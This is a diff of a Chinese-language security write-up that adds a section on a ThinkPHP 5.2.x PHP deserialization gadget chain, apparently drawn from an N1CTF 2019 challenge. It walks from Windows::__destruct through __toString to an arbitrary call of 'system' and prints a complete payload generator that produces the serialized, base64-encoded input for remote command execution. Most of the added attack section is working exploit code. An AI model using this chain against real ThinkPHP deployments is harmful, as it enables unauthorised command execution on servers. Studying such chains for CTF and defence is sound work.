@@ -2672,7 +2672,7 @@ $this->visible = [];
 $this->hidden = [];
 ```
 
-将`$this->append`设置为array('getError')`从而让`$modelRelation`的内容可控,需要满足`method_exists($modelRelation, 'getBindAttr')`,因此将`$this->error`设置为`\think\model\relation\OneToOne`某个子类的对象
+将`$this->append`设置为`array('getError')`从而让`$modelRelation`的内容可控,需要满足`method_exists($modelRelation, 'getBindAttr')`,因此将`$this->error`设置为`\think\model\relation\OneToOne`某个子类的对象
 
 将`$this->parent`与`\think\db\Query::$model`设置为同一对象,使`$value = $this->parent;`,从而使`$value`可控
 
@@ -3210,7 +3210,7 @@ trait Conversion
 
 此时`$key`为`misaka`,为了使`$relation = $this->getRelation($key);`可控,将`$this->relation`设置为`array('misaka' => 某个类的对象);`通过`$this->relation[$name]`达到可控
 
-`$relation->append($name)`可以调用任意类的append方法或__call方法且$name可控
+`$relation->append($name)`可以调用任意类的`append`方法或`__call`方法且`$name`可控
 
 3. __call
 
@@ -3346,7 +3346,7 @@ $method = "append"
 
 在`param`中将`$this->mergeParam`设置为`true`即可跳过干扰项,而由于`$name`为`$this->config['var_ajax']`,因此将`$this->config['var_ajax']`设置为`true`即可满足条件`true === $name`
 
-在`file`中`$files = $this->file;`因此`$files可控,将`$this->file`设置为空值即可绕过`!empty($files)`使得`param`中的`$file`为`null`
+在`file`中`$files = $this->file;`因此`$files`可控,将`$this->file`设置为空值即可绕过`!empty($files)`使得`param`中的`$file`为`null`
 
 因此`is_array($file)`为`false`,`$data=$this->param`可控,进入到`$this->input()`,此时`$data`参数可控
 
@@ -3491,4 +3491,294 @@ namespace {
 
 ## 5.2.x版本
 
->todo
+源码来源于N1CTF的[sql_manage](https://github.com/Nu1LCTF/n1ctf-2019/tree/master/WEB/sql_manage/Docker)
+
+`app/controller/Index.php`
+
+```php
+<?php
+
+namespace app\controller;
+
+class Index
+{
+    public function index()
+    {
+        $s=input('post.s');
+        $s=base64_decode($s);
+        unserialize($s);
+    }
+}
+```
+
+1. 反序列化入口 
+
+`\think\process\pipes\Windows::__destruct`
+
+```php
+#vendor/topthink/framework/src/think/process/pipes/Windows.php
+    public function __destruct()
+    {
+        $this->close();
+        $this->removeFiles();
+    }
+
+    public function close()
+    {
+        parent::close();
+        foreach ($this->fileHandles as $handle) {
+            fclose($handle);
+        }
+        $this->fileHandles = [];
+    }
+
+    public function close()#parent
+    {
+        foreach ($this->pipes as $pipe) {
+            fclose($pipe);
+        }
+        $this->pipes = [];
+    }
+
+    private function removeFiles()
+    {
+        foreach ($this->files as $filename) {
+            if (file_exists($filename)) {
+                @unlink($filename);
+            }
+        }
+        $this->files = [];
+    }
+```
+
+利用`file_exists`调用`__toString`(跟5.0.x一样)
+
+2. __toString
+
+`\think\model\concern\Conversion::__toString`
+
+```php
+#vendor/topthink/framework/src/think/model/concern/Conversion.php
+trait Conversion
+{
+    public function __toString()
+    {
+        return $this->toJson();
+    }
+
+    public function toJson(int $options = JSON_UNESCAPED_UNICODE): string
+    {
+        return json_encode($this->toArray(), $options);
+    }
+
+    public function toArray(): array
+    {
+        $item       = [];
+        $hasVisible = false;
+
+        foreach ($this->visible as $key => $val) {
+            if (is_string($val)) {
+                ...
+            }
+        }
+
+        foreach ($this->hidden as $key => $val) {
+            if (is_string($val)) {
+                ...
+            }
+        }
+
+        // 合并关联数据
+        $data = array_merge($this->data, $this->relation);
+
+        foreach ($data as $key => $val) {
+            if ($val instanceof Model || $val instanceof ModelCollection) {
+                ...
+            } elseif (isset($this->visible[$key])) {
+                $item[$key] = $this->getAttr($key);
+            } elseif (!isset($this->hidden[$key]) && !$hasVisible) {
+                $item[$key] = $this->getAttr($key);
+            }
+        }
+
+        // 追加属性（必须定义获取器）
+        foreach ($this->append as $key => $name) {
+            $this->appendAttrToArray($item, $key, $name);
+        }
+
+        return $item;
+    }
+}
+```
+
+将`$this->visible`和`$this->hidden`中的值设置成非`string`类型,从而绕过`is_string`处理
+
+`$hasVisible`为`false`,因此需要设置`$this->hidden[$key]`从而避免进入`elseif (!isset($this->hidden[$key]) && !$hasVisible)`
+
+最终设置的值为
+
+```php
+$this->visible = array('misaka' => array());
+$this->hidden = array(0 => array(), 1 => array(), 'misaka' => array());
+$this->data = array('system', $payload);
+$this->relation = array('misaka' => 'call_user_func');
+$this->withAttr = array('misaka' => 'call_user_func_array');
+```
+
+传入getattr的参数为`misaka`
+
+```php
+#vendor/topthink/framework/src/think/model/concern/Attribute.php
+    public function getAttr(string $name)
+    {
+        try {
+            $relation = false;
+            $value    = $this->getData($name);
+        } catch (InvalidArgumentException $e) {
+            $relation = true;
+            $value    = null;
+        }
+
+        return $this->getValue($name, $value, $relation);
+    }
+
+    public function getData(string $name = null)
+    {
+        if (is_null($name)) {
+            return $this->data;
+        }
+
+        $fieldName = $this->getRealFieldName($name);#return $this->strict ? $name : App::parseName($name);
+
+        if (array_key_exists($fieldName, $this->data)) {
+            return $this->data[$fieldName];
+        } elseif (array_key_exists($name, $this->relation)) {
+            return $this->relation[$name];
+        }
+        ...
+    }
+
+    protected function getValue(string $name, $value, bool $relation = false)
+    {
+        // 检测属性获取器
+        $fieldName = $this->getRealFieldName($name);#return $this->strict ? $name : App::parseName($name);
+        $method    = 'get' . App::parseName($name, 1) . 'Attr';
+
+        if (isset($this->withAttr[$fieldName])) {
+            if ($relation) {
+                $value = $this->getRelationValue($name);
+            }
+
+            $closure = $this->withAttr[$fieldName];
+            $value   = $closure($value, $this->data);#任意函数调用 RCE
+        }...
+
+        return $value;
+    }
+```
+
+进入到`\think\model\concern\Attribute::getAttr`后,首先通过`getData`获取`$value`
+
+满足`array_key_exists($name, $this->relation)`,从而将`$value`设置为`$this->relation[$name]`即`call_user_func`
+
+然后进入`getValue`,此时`$fieldName`为`misaka`,`$value`为`call_user_func`,`$relation`为默认值`false`
+
+`$this->withAttr[$fieldName];`为`call_user_func_array`
+
+最终生成的利用形式为`call_user_func_array(call_user_func,array('system', $payload));`
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204301815030.png)
+
+payload
+
+```php
+<?php
+
+namespace think\process\pipes {
+
+    use think\Process;
+
+    class Windows
+    {
+        private $files;
+        public $pipes;
+        private $fileHandles;
+
+        public function __construct(array $files)
+        {
+            $this->fileHandles = [];
+            $this->pipes = [];
+            $this->files = $files;
+        }
+    }
+}
+
+namespace think\model\concern {
+
+    trait Conversion
+    {
+        protected $visible;
+        protected $hidden;
+        protected $append;
+    }
+
+    trait RelationShip
+    {
+        private $relation;
+    }
+
+    trait Attribute
+    {
+        private $data;
+        private $withAttr;
+        protected $strict;
+    }
+}
+
+namespace think {
+
+    use ArrayAccess;
+    use JsonSerializable;
+    use think\db\Query;
+    use think\facade\Db;
+
+    class Model
+    {
+        use model\concern\Attribute;
+        use model\concern\RelationShip;
+        use model\concern\Conversion;
+
+        public function __construct($payload)
+        {
+            $this->visible = array('misaka' => array());
+            $this->strict = true;
+            $this->hidden = array(0 => array(), 1 => array(), 'misaka' => array());
+            $this->data = array('system', $payload);
+            $this->relation = array('misaka' => 'call_user_func');
+            $this->withAttr = array('misaka' => 'call_user_func_array');
+        }
+    }
+}
+
+
+namespace think\model {
+
+    use think\Model;
+
+    class Pivot extends Model
+    {
+        public function __construct($payload)
+        {
+            parent::__construct($payload);
+        }
+    }
+}
+
+namespace {
+    $a = new \think\model\Pivot('id');
+    $b = new \think\process\pipes\Windows(array($a));
+    echo 's=' . urlencode(base64_encode(serialize($b)));
+}
+```
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204301742237.png)
